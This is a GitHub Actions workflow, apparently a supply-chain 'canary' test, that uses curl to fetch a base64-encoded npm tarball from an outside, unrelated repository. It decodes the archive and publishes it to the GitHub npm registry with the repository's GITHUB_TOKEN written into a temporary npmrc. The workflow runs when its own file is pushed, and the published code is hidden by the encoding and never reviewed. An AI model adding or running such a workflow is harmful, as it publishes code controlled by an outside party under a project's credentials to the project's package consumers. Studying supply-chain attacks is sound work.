name: G10 npm archive parser canary
on:
  push:
    paths:
      - .github/workflows/g10-npm-parser.yml
permissions:
  contents: read
  packages: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: Publish secondary-controlled npm archive
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -eux
          mkdir -p /tmp/g10npm
          curl -fsSL https://github.com/apexblack-kangaroo-1782761273/chainship-test-release/raw/refs/heads/main/g10-npm-package.tgz.b64 -o /tmp/g10npm/package.tgz.b64
          base64 -d /tmp/g10npm/package.tgz.b64 > /tmp/g10npm/package.tgz
          printf '%s\n' "//npm.pkg.github.com/:_authToken=${GITHUB_TOKEN}" > /tmp/g10npmrc
          NPM_CONFIG_USERCONFIG=/tmp/g10npmrc npm publish /tmp/g10npm/package.tgz --registry=https://npm.pkg.github.com
